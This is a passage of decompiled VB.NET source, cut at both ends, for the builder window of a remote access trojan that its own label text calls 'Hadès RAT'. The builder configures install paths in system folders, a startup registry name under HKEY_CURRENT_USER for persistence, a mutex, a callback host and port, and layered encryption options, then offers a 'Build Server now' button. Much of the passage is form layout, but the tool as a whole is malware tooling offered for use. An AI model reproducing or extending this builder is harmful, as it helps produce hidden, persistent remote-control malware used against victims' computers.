            Me.TabPage4.Name = "TabPage4"
            padding = New Padding(3)
            Me.TabPage4.Padding = padding
            size = New Size(&H1BC, &H156)
            Me.TabPage4.Size = size
            Me.TabPage4.TabIndex = 1
            Me.TabPage4.Text = "Install"
            Me.GroupBox9.Controls.Add(Me.Button4)
            Me.GroupBox9.Controls.Add(Me.TextBox_0)
            point = New Point(8, &H126)
            Me.GroupBox9.Location = point
            Me.GroupBox9.Name = "GroupBox9"
            size = New Size(430, &H2A)
            Me.GroupBox9.Size = size
            Me.GroupBox9.TabIndex = 40
            Me.GroupBox9.TabStop = False
            Me.GroupBox9.Text = "Mutex"
            point = New Point(&H98, &H10)
            Me.Button4.Location = point
            Me.Button4.Name = "Button4"
            size = New Size(&H3E, 20)
            Me.Button4.Size = size
            Me.Button4.TabIndex = &H2A
            Me.Button4.Text = "Generate"
            Me.Button4.UseVisualStyleBackColor = True
            Me.TextBox_0.BackColor = Color.White
            point = New Point(6, &H10)
            Me.TextBox_0.Location = point
            Me.TextBox_0.Name = "TextBox10"
            Me.TextBox_0.ReadOnly = True
            size = New Size(140, &H15)
            Me.TextBox_0.Size = size
            Me.TextBox_0.TabIndex = &H29
            Me.Label14.AutoSize = True
            Me.Label14.Font = New Font("Microsoft Sans Serif", 18!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.Label14.ForeColor = SystemColors.ControlDarkDark
            point = New Point(6, 5)
            Me.Label14.Location = point
            Me.Label14.Name = "Label14"
            size = New Size(&H4B, &H1D)
            Me.Label14.Size = size
            Me.Label14.TabIndex = &H27
            Me.Label14.Text = "Install"
            Me.GroupBox3.Controls.Add(Me.Label12)
            Me.GroupBox3.Controls.Add(Me.Label6)
            Me.GroupBox3.Controls.Add(Me.Label13)
            Me.GroupBox3.Controls.Add(Me.TextBox3)
            Me.GroupBox3.Controls.Add(Me.TextBox8)
            point = New Point(6, &H25)
            Me.GroupBox3.Location = point
            Me.GroupBox3.Name = "GroupBox3"
            size = New Size(430, &H48)
            Me.GroupBox3.Size = size
            Me.GroupBox3.TabIndex = &H26
            Me.GroupBox3.TabStop = False
            Me.GroupBox3.Text = "Install Names"
            Me.Label12.AutoSize = True
            point = New Point(6, &H10)
            Me.Label12.Location = point
            Me.Label12.Name = "Label12"
            size = New Size(&H4A, 13)
            Me.Label12.Size = size
            Me.Label12.TabIndex = 20
            Me.Label12.Text = "Server-Name:"
            Me.Label6.AutoSize = True
            point = New Point(6, &H2A)
            Me.Label6.Location = point
            Me.Label6.Name = "Label6"
            size = New Size(&HC7, 13)
            Me.Label6.Size = size
            Me.Label6.TabIndex = &H17
            Me.Label6.Text = "Startup-Name (HKEY_CURRENT_USER):"
            Me.Label13.AutoSize = True
            point = New Point(&HE3, &H10)
            Me.Label13.Location = point
            Me.Label13.Name = "Label13"
            size = New Size(&H1D, 13)
            Me.Label13.Size = size
            Me.Label13.TabIndex = &H15
            Me.Label13.Text = ".exe"
            point = New Point(220, &H27)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            size = New Size(140, &H15)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = &H16
            point = New Point(&H51, 13)
            Me.TextBox8.Location = point
            Me.TextBox8.Name = "TextBox8"
            size = New Size(140, &H15)
            Me.TextBox8.Size = size
            Me.TextBox8.TabIndex = &H13
            Me.TextBox8.Text = "server"
            Me.GroupBox2.Controls.Add(Me.RadioButton6)
            Me.GroupBox2.Controls.Add(Me.PictureBox6)
            Me.GroupBox2.Controls.Add(Me.RadioButton5)
            Me.GroupBox2.Controls.Add(Me.RadioButton4)
            Me.GroupBox2.Controls.Add(Me.Label11)
            Me.GroupBox2.Controls.Add(Me.Label7)
            Me.GroupBox2.Controls.Add(Me.PictureBox3)
            Me.GroupBox2.Controls.Add(Me.Label5)
            Me.GroupBox2.Controls.Add(Me.PictureBox2)
            Me.GroupBox2.Controls.Add(Me.TextBox9)
            Me.GroupBox2.Controls.Add(Me.RadioButton3)
            Me.GroupBox2.Controls.Add(Me.RadioButton1)
            Me.GroupBox2.Controls.Add(Me.RadioButton2)
            point = New Point(8, &H73)
            Me.GroupBox2.Location = point
            Me.GroupBox2.Name = "GroupBox2"
            size = New Size(430, 120)
            Me.GroupBox2.Size = size
            Me.GroupBox2.TabIndex = &H25
            Me.GroupBox2.TabStop = False
            Me.GroupBox2.Text = "Install Directory"
            Me.RadioButton6.AutoSize = True
            point = New Point(&H3E, &H40)
            Me.RadioButton6.Location = point
            Me.RadioButton6.Name = "RadioButton6"
            size = New Size(&H52, &H11)
            Me.RadioButton6.Size = size
            Me.RadioButton6.TabIndex = 40
            Me.RadioButton6.TabStop = True
            Me.RadioButton6.Text = "Don't Install"
            Me.RadioButton6.UseVisualStyleBackColor = True
            Me.PictureBox6.Image = Class5.smethod_88
            point = New Point(&HC0, &H11)
            Me.PictureBox6.Location = point
            Me.PictureBox6.Name = "PictureBox6"
            size = New Size(&H10, 20)
            Me.PictureBox6.Size = size
            Me.PictureBox6.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PictureBox6.TabIndex = &H27
            Me.PictureBox6.TabStop = False
            Me.RadioButton5.AutoSize = True
            point = New Point(&HD6, 20)
            Me.RadioButton5.Location = point
            Me.RadioButton5.Name = "RadioButton5"
            size = New Size(70, &H11)
            Me.RadioButton5.Size = size
            Me.RadioButton5.TabIndex = &H26
            Me.RadioButton5.TabStop = True
            Me.RadioButton5.Text = "Favorites"
            Me.RadioButton5.UseVisualStyleBackColor = True
            Me.RadioButton4.AutoSize = True
            point = New Point(&H3E, &H2A)
            Me.RadioButton4.Location = point
            Me.RadioButton4.Name = "RadioButton4"
            size = New Size(&H6C, &H11)
            Me.RadioButton4.Size = size
            Me.RadioButton4.TabIndex = &H25
            Me.RadioButton4.TabStop = True
            Me.RadioButton4.Text = "Temporary folder"
            Me.RadioButton4.UseVisualStyleBackColor = True
            Me.Label11.AutoSize = True
            Me.Label11.Font = New Font("Microsoft Sans Serif", 6.75!, FontStyle.Regular, GraphicsUnit.Point, 0)
            point = New Point(&H110, &H60)
            Me.Label11.Location = point
            Me.Label11.Name = "Label11"
            size = New Size(&H8A, 12)
            Me.Label11.Size = size
            Me.Label11.TabIndex = &H24
            Me.Label11.Text = "leave blank for no extra directory"
            Me.Label7.AutoSize = True
            point = New Point(6, &H15)
            Me.Label7.Location = point
            Me.Label7.Name = "Label7"
            size = New Size(&H37, 13)
            Me.Label7.Size = size
            Me.Label7.TabIndex = &H1B
            Me.Label7.Text = "Directory:"
            Me.PictureBox3.Image = Class5.smethod_88
            point = New Point(&HC0, &H40)
            Me.PictureBox3.Location = point
            Me.PictureBox3.Name = "PictureBox3"
            size = New Size(&H10, 20)
            Me.PictureBox3.Size = size
            Me.PictureBox3.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PictureBox3.TabIndex = &H23
            Me.PictureBox3.TabStop = False
            Me.Label5.AutoSize = True
            point = New Point(6, &H5F)
            Me.Label5.Location = point
            Me.Label5.Name = "Label5"
            size = New Size(&H72, 13)
            Me.Label5.Size = size
            Me.Label5.TabIndex = &H18
            Me.Label5.Text = "Extra Directory Name:"
            Me.PictureBox2.Image = Class5.smethod_88
            point = New Point(&HC0, 40)
            Me.PictureBox2.Location = point
            Me.PictureBox2.Name = "PictureBox2"
            size = New Size(&H10, 20)
            Me.PictureBox2.Size = size
            Me.PictureBox2.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PictureBox2.TabIndex = &H22
            Me.PictureBox2.TabStop = False
            point = New Point(&H7A, &H5C)
            Me.TextBox9.Location = point
            Me.TextBox9.Name = "TextBox9"
            size = New Size(&H90, &H15)
            Me.TextBox9.Size = size
            Me.TextBox9.TabIndex = &H19
            Me.RadioButton3.AutoSize = True
            point = New Point(&HD6, &H41)
            Me.RadioButton3.Location = point
            Me.RadioButton3.Name = "RadioButton3"
            size = New Size(&H59, &H11)
            Me.RadioButton3.Size = size
            Me.RadioButton3.TabIndex = &H1D
            Me.RadioButton3.Text = "Program Files"
            Me.RadioButton3.UseVisualStyleBackColor = True
            Me.RadioButton1.AutoSize = True
            Me.RadioButton1.Checked = True
            point = New Point(&H3E, 20)
            Me.RadioButton1.Location = point
            Me.RadioButton1.Name = "RadioButton1"
            size = New Size(&H67, &H11)
            Me.RadioButton1.Size = size
            Me.RadioButton1.TabIndex = &H1A
            Me.RadioButton1.TabStop = True
            Me.RadioButton1.Text = "Application Data"
            Me.RadioButton1.UseVisualStyleBackColor = True
            Me.RadioButton2.AutoSize = True
            point = New Point(&HD6, &H2A)
            Me.RadioButton2.Location = point
            Me.RadioButton2.Name = "RadioButton2"
            size = New Size(60, &H11)
            Me.RadioButton2.Size = size
            Me.RadioButton2.TabIndex = &H1C
            Me.RadioButton2.Text = "System"
            Me.RadioButton2.UseVisualStyleBackColor = True
            Me.GroupBox1.Controls.Add(Me.Label15)
            point = New Point(8, &HF1)
            Me.GroupBox1.Location = point
            Me.GroupBox1.Name = "GroupBox1"
            size = New Size(430, &H2F)
            Me.GroupBox1.Size = size
            Me.GroupBox1.TabIndex = &H24
            Me.GroupBox1.TabStop = False
            Me.GroupBox1.Text = "Example Path on your PC:"
            Me.Label15.AutoSize = True
            point = New Point(6, &H15)
            Me.Label15.Location = point
            Me.Label15.Name = "Label15"
            size = New Size(&H37, 13)
            Me.Label15.Size = size
            Me.Label15.TabIndex = &H1F
            Me.Label15.Text = "%PATH%"
            Me.TabPage3.BackColor = Color.White
            Me.TabPage3.Controls.Add(Me.GroupBox5)
            Me.TabPage3.Controls.Add(Me.GroupBox4)
            Me.TabPage3.Controls.Add(Me.Label16)
            point = New Point(140, 4)
            Me.TabPage3.Location = point
            Me.TabPage3.Name = "TabPage3"
            padding = New Padding(3)
            Me.TabPage3.Padding = padding
            size = New Size(&H1BC, &H156)
            Me.TabPage3.Size = size
            Me.TabPage3.TabIndex = 0
            Me.TabPage3.Text = "Connection"
            Me.GroupBox5.Controls.Add(Me.Label9)
            Me.GroupBox5.Controls.Add(Me.PictureBox5)
            Me.GroupBox5.Controls.Add(Me.Label18)
            Me.GroupBox5.Controls.Add(Me.Button2)
            point = New Point(6, &HD9)
            Me.GroupBox5.Location = point
            Me.GroupBox5.Name = "GroupBox5"
            size = New Size(430, &H34)
            Me.GroupBox5.Size = size
            Me.GroupBox5.TabIndex = &H2A
            Me.GroupBox5.TabStop = False
            Me.GroupBox5.Text = "Test Connection"
            Me.Label9.AutoSize = True
            point = New Point(260, &H18)
            Me.Label9.Location = point
            Me.Label9.Name = "Label9"
            size = New Size(&HA3, 13)
            Me.Label9.Size = size
            Me.Label9.TabIndex = 3
            Me.Label9.Text = "Please enter a Host/IP and Port!"
            Me.Label9.Visible = False
            point = New Point(&HEE, &H16)
            Me.PictureBox5.Location = point
            Me.PictureBox5.Name = "PictureBox5"
            size = New Size(&H10, &H10)
            Me.PictureBox5.Size = size
            Me.PictureBox5.TabIndex = 2
            Me.PictureBox5.TabStop = False
            Me.Label18.AutoSize = True
            Me.Label18.Font = New Font("Microsoft Sans Serif", 9.75!, FontStyle.Regular, GraphicsUnit.Point, 0)
            point = New Point(&HB8, &H16)
            Me.Label18.Location = point
            Me.Label18.Name = "Label18"
            size = New Size(&H30, &H10)
            Me.Label18.Size = size
            Me.Label18.TabIndex = 1
            Me.Label18.Text = "Status:"
            Me.Button2.Image = DirectCast(manager.GetObject("Button2.Image"), Image)
            Me.Button2.ImageAlign = ContentAlignment.MiddleLeft
            point = New Point(6, &H13)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&H92, &H17)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 0
            Me.Button2.Text = "Test Connection now"
            Me.Button2.UseVisualStyleBackColor = True
            Me.GroupBox4.Controls.Add(Me.PictureBox4)
            Me.GroupBox4.Controls.Add(Me.Label1)
            Me.GroupBox4.Controls.Add(Me.Label4)
            Me.GroupBox4.Controls.Add(Me.CheckBox1)
            Me.GroupBox4.Controls.Add(Me.Label2)
            Me.GroupBox4.Controls.Add(Me.Label8)
            Me.GroupBox4.Controls.Add(Me.Label3)
            Me.GroupBox4.Controls.Add(Me.TextBox5)
            Me.GroupBox4.Controls.Add(Me.TextBox1)
            Me.GroupBox4.Controls.Add(Me.TextBox2)
            point = New Point(6, &H25)
            Me.GroupBox4.Location = point
            Me.GroupBox4.Name = "GroupBox4"
            size = New Size(430, &HAE)
            Me.GroupBox4.Size = size
            Me.GroupBox4.TabIndex = &H29
            Me.GroupBox4.TabStop = False
            Me.GroupBox4.Text = "Connection Settings"
            Me.PictureBox4.Image = DirectCast(manager.GetObject("PictureBox4.Image"), Image)
            point = New Point(&H114, &H79)
            Me.PictureBox4.Location = point
            Me.PictureBox4.Name = "PictureBox4"
            size = New Size(&H10, &H11)
            Me.PictureBox4.Size = size
            Me.PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox4.TabIndex = &H24
            Me.PictureBox4.TabStop = False
            Me.Label1.AutoSize = True
            point = New Point(6, 20)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H2F, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = &H1F
            Me.Label1.Text = "Host/IP:"
            Me.Label4.AutoSize = True
            point = New Point(&H41, &H58)
            Me.Label4.Location = point
            Me.Label4.Name = "Label4"
            size = New Size(&H4E, 13)
            Me.Label4.Size = size
            Me.Label4.TabIndex = &H1C
            Me.Label4.Text = "Example: 1773"
            Me.CheckBox1.AutoSize = True
            point = New Point(&H44, &H92)
            Me.CheckBox1.Location = point
            Me.CheckBox1.Name = "CheckBox1"
            size = New Size(&H65, &H11)
            Me.CheckBox1.Size = size
            Me.CheckBox1.TabIndex = &H22
            Me.CheckBox1.Text = "Show Password"
            Me.CheckBox1.UseVisualStyleBackColor = True
            Me.Label2.AutoSize = True
            point = New Point(6, &H44)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H1F, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = &H20
            Me.Label2.Text = "Port:"
            Me.Label3.AutoSize = True
            point = New Point(&H41, 40)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&HB5, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = &H21
            Me.Label3.Text = "Example: example.com or 127.0.0.1"
            point = New Point(&H44, &H11)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(&HB3, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = &H1B
            point = New Point(&H44, &H41)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&HAC, &H15)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = &H1D
            Me.Label16.AutoSize = True
            Me.Label16.Font = New Font("Microsoft Sans Serif", 18!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.Label16.ForeColor = SystemColors.ControlDarkDark
            point = New Point(6, 5)
            Me.Label16.Location = point
            Me.Label16.Name = "Label16"
            size = New Size(&H87, &H1D)
            Me.Label16.Size = size
            Me.Label16.TabIndex = 40
            Me.Label16.Text = "Connection"
            Me.SideTab1.Alignment = TabAlignment.Left
            Me.SideTab1.Controls.Add(Me.TabPage3)
            Me.SideTab1.Controls.Add(Me.TabPage4)
            Me.SideTab1.Controls.Add(Me.TabPage5)
            Me.SideTab1.Controls.Add(Me.TabPage7)
            Me.SideTab1.Controls.Add(Me.TabPage6)
            Me.SideTab1.method_1(50)
            size = New Size(&H2C, &H88)
            Me.SideTab1.ItemSize = size
            point = New Point(0, 0)
            Me.SideTab1.Location = point
            Me.SideTab1.Multiline = True
            Me.SideTab1.Name = "SideTab1"
            Me.SideTab1.SelectedIndex = 0
            size = New Size(&H24C, 350)
            Me.SideTab1.Size = size
            Me.SideTab1.SizeMode = TabSizeMode.Fixed
            Me.SideTab1.TabIndex = 0
            Me.TabPage7.BackColor = Color.White
            Me.TabPage7.Controls.Add(Me.TextBox_1)
            Me.TabPage7.Controls.Add(Me.Label17)
            Me.TabPage7.Controls.Add(Me.CheckBox_0)
            Me.TabPage7.Controls.Add(Me.CheckBox_1)
            Me.TabPage7.Controls.Add(Me.CheckBox_2)
            Me.TabPage7.Controls.Add(Me.CheckBox_3)
            Me.TabPage7.Controls.Add(Me.CheckBox7)
            Me.TabPage7.Controls.Add(Me.CheckBox8)
            Me.TabPage7.Controls.Add(Me.CheckBox9)
            Me.TabPage7.Controls.Add(Me.CheckBox_4)
            point = New Point(140, 4)
            Me.TabPage7.Location = point
            Me.TabPage7.Name = "TabPage7"
            size = New Size(&H1BC, &H156)
            Me.TabPage7.Size = size
            Me.TabPage7.TabIndex = 4
            Me.TabPage7.Text = "Multi-Encryption"
            point = New Point(&H18, 130)
            Me.TextBox_1.Location = point
            Me.TextBox_1.Multiline = True
            Me.TextBox_1.Name = "TextBox11"
            size = New Size(&H12A, &H3B)
            Me.TextBox_1.Size = size
            Me.TextBox_1.TabIndex = 14
            Me.TextBox_1.Text = "xJiqkxcpAeklx5987quTixoNzpQlwKnApEuTxNQooeuTR1pmwqa785dsoxnwPOSnwQiTyQiApoEQwXnebVQiwoQ4Qa12Q3w9bNwoa458Qjwq"
            Me.Label17.AutoSize = True
            point = New Point(&H34, 15)
            Me.Label17.Location = point
            Me.Label17.Name = "Label17"
            size = New Size(&HED, 13)
            Me.Label17.Size = size
            Me.Label17.TabIndex = 13
            Me.Label17.Text = "(Had" & ChrW(232) & "s RAT can support all encryption checked)"
            Me.CheckBox_0.AutoSize = True
            point = New Point(&H22, 90)
            Me.CheckBox_0.Location = point
            Me.CheckBox_0.Name = "CheckBox11"
            size = New Size(&H49, &H11)
            Me.CheckBox_0.Size = size
            Me.CheckBox_0.TabIndex = 10
            Me.CheckBox_0.Text = "PolyStairs"
            Me.CheckBox_0.UseVisualStyleBackColor = True
            Me.CheckBox_1.AutoSize = True
            point = New Point(&H71, 90)
            Me.CheckBox_1.Location = point
            Me.CheckBox_1.Name = "CheckBox12"
            size = New Size(&H2E, &H11)
            Me.CheckBox_1.Size = size
            Me.CheckBox_1.TabIndex = 11
            Me.CheckBox_1.Text = "RC4"
            Me.CheckBox_1.UseVisualStyleBackColor = True
            Me.CheckBox_2.AutoSize = True
            point = New Point(&HAD, 90)
            Me.CheckBox_2.Location = point
            Me.CheckBox_2.Name = "CheckBox13"
            size = New Size(&H43, &H11)
            Me.CheckBox_2.Size = size
            Me.CheckBox_2.TabIndex = 12
            Me.CheckBox_2.Text = "BASE-64"
            Me.CheckBox_2.UseVisualStyleBackColor = True
            Me.CheckBox_3.AutoSize = True
            point = New Point(&HFC, 90)
            Me.CheckBox_3.Location = point
            Me.CheckBox_3.Name = "CheckBox14"
            size = New Size(&H40, &H11)
            Me.CheckBox_3.Size = size
            Me.CheckBox_3.TabIndex = 9
            Me.CheckBox_3.Text = "Rijndael"
            Me.CheckBox_3.UseVisualStyleBackColor = True
            Me.CheckBox7.AutoSize = True
            Me.CheckBox7.Checked = True
            Me.CheckBox7.CheckState = CheckState.Checked
            point = New Point(&H22, &H2F)
            Me.CheckBox7.Location = point
            Me.CheckBox7.Name = "CheckBox7"
            size = New Size(&H2D, &H11)
            Me.CheckBox7.Size = size
            Me.CheckBox7.TabIndex = 6
            Me.CheckBox7.Text = "AES"
            Me.CheckBox7.UseVisualStyleBackColor = True
            Me.CheckBox8.AutoSize = True
            point = New Point(&H71, &H2F)
            Me.CheckBox8.Location = point
            Me.CheckBox8.Name = "CheckBox8"
            size = New Size(&H2E, &H11)
            Me.CheckBox8.Size = size
            Me.CheckBox8.TabIndex = 7
            Me.CheckBox8.Text = "RC4"
            Me.CheckBox8.UseVisualStyleBackColor = True
            Me.CheckBox9.AutoSize = True
            point = New Point(&HAD, &H2F)
            Me.CheckBox9.Location = point
            Me.CheckBox9.Name = "CheckBox9"
            size = New Size(&H2F, &H11)
            Me.CheckBox9.Size = size
            Me.CheckBox9.TabIndex = 8
            Me.CheckBox9.Text = "XOR"
            Me.CheckBox9.UseVisualStyleBackColor = True
            Me.CheckBox_4.AutoSize = True
            point = New Point(&HFC, &H2F)
            Me.CheckBox_4.Location = point
            Me.CheckBox_4.Name = "CheckBox10"
            size = New Size(&H2E, &H11)
            Me.CheckBox_4.Size = size
            Me.CheckBox_4.TabIndex = 0
            Me.CheckBox_4.Text = "RC2"
            Me.CheckBox_4.UseVisualStyleBackColor = True
            point = New Point(11, &H16B)
            Me.Win8Progressbar1.Location = point
            Me.Win8Progressbar1.Maximum = 10
            Me.Win8Progressbar1.Name = "Win8Progressbar1"
            size = New Size(&H1AB, &H17)
            Me.Win8Progressbar1.Size = size
            Me.Win8Progressbar1.TabIndex = 5
            Me.Button1.Image = DirectCast(manager.GetObject("Button1.Image"), Image)
            Me.Button1.ImageAlign = ContentAlignment.TopLeft
            point = New Point(&H1BC, &H163)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H84, &H27)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 1
            Me.Button1.Text = "Build Server now"
            Me.Button1.UseVisualStyleBackColor = True
            Me.AcceptButton = Me.Button1
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            Me.BackColor = Color.White
            size = New Size(&H24C, 400)
            Me.ClientSize = size
            Me.Controls.Add(Me.Win8Progressbar1)
            Me.Controls.Add(Me.CheckBox3)
            Me.Controls.Add(Me.TextBox4)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.SideTab1)
            Me.DoubleBuffered = True
            Me.FormBorderStyle = FormBorderStyle.Fixed3D
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "Builder"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Server Editor"
            Me.TabPage6.ResumeLayout(False)
            Me.TabPage6.PerformLayout
            Me.GroupBox_0.ResumeLayout(False)
            Me.GroupBox_0.PerformLayout
            Me.GroupBox8.ResumeLayout(False)
            Me.GroupBox8.PerformLayout
            DirectCast(Me.PictureBox7, ISupportInitialize).EndInit
            Me.TabPage5.ResumeLayout(False)
            Me.TabPage5.PerformLayout
            Me.GroupBox7.ResumeLayout(False)
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.GroupBox6.ResumeLayout(False)
            Me.GroupBox6.PerformLayout
            Me.TabPage4.ResumeLayout(False)
            Me.TabPage4.PerformLayout
            Me.GroupBox9.ResumeLayout(False)
            Me.GroupBox9.PerformLayout
            Me.GroupBox3.ResumeLayout(False)
            Me.GroupBox3.PerformLayout
            Me.GroupBox2.ResumeLayout(False)
            Me.GroupBox2.PerformLayout
            DirectCast(Me.PictureBox6, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox3, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox2, ISupportInitialize).EndInit
            Me.GroupBox1.ResumeLayout(False)
            Me.GroupBox1.PerformLayout
            Me.TabPage3.ResumeLayout(False)
            Me.TabPage3.PerformLayout
            Me.GroupBox5.ResumeLayout(False)
            Me.GroupBox5.PerformLayout
            DirectCast(Me.PictureBox5, ISupportInitialize).EndInit
            Me.GroupBox4.ResumeLayout(False)
            Me.GroupBox4.PerformLayout
            DirectCast(Me.PictureBox4, ISupportInitialize).EndInit
            Me.SideTab1.ResumeLayout(False)
            Me.TabPage7.ResumeLayout(False)
            Me.TabPage7.PerformLayout
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub method_0()
            If Not Me.CheckBox3.Checked Then
                Dim i As Integer = Me.Size.Height
                Do While (i <= &H20C)
                    Thread.Sleep(1)
                    Application.DoEvents
                    Dim point As New Point(&H256, i)
                    Me.Size = DirectCast(point, Size)
                    i += 1
                Loop
                Me.CheckBox3.Checked = True
            End If
        End Sub

        Private Function method_1(ByVal int_0 As Integer, ByVal string_0 As String) As Object
            Dim str As String = String.Empty
            Dim random As New Random
            Dim num As Integer = (int_0 - 1)
            Dim i As Integer = 0
            Do While (i <= num)
                VBMath.Randomize
                str = (str & Conversions.ToString(string_0.Chars(random.Next(0, (string_0.Length - 1)))))
                i += 1
            Loop
            Return str
        End Function

        Private Sub RadioButton1_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ApplicationData), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton2.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.System), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.System) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton3.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ProgramFiles), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ProgramFiles) & "\" & Me.TextBox8.Text & ".exe")
                End If
            End If
        End Sub

        Private Sub RadioButton2_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ApplicationData), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton2.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.System), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.System) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton3.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ProgramFiles), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ProgramFiles) & "\" & Me.TextBox8.Text & ".exe")
                End If
            End If
        End Sub

        Private Sub RadioButton3_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ApplicationData), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton2.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.System), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.System) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton3.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ProgramFiles), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ProgramFiles) & "\" & Me.TextBox8.Text & ".exe")
                End If
            End If
        End Sub

        Private Sub RadioButton4_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub RadioButton5_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub RadioButton6_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Public Sub Showit()
            Me.Label9.Visible = True
            Dim num As Integer = 1
            Do
                Thread.Sleep(10)
                Application.DoEvents
                num += 1
            Loop While (num <= 100)
            Me.Label9.Visible = False
        End Sub

        Public Sub StopCheck()
            Me.Button2.Enabled = True
            Me.thread_0.Abort
        End Sub

        Private Sub TabPage7_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub TextBox2_KeyPress(ByVal sender As Object, ByVal e As KeyPressEventArgs)
            Dim num As Integer = Strings.Asc(e.KeyChar)
            If (((num < &H30) OrElse (num > &H39)) AndAlso (num <> 8)) Then
                e.Handled = True
            End If
        End Sub

        Private Sub TextBox8_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            If Me.RadioButton1.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
                    Me.Label15.Text = String.Concat(New String() { Environment.GetFolderPath(SpecialFolder.ApplicationData), "\", Me.TextBox9.Text, "\", Me.TextBox8.Text, ".exe" })
                Else
                    Me.Label15.Text = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\" & Me.TextBox8.Text & ".exe")
                End If
            ElseIf Me.RadioButton2.Checked Then
                If (Me.TextBox9.Text <> Nothing) Then
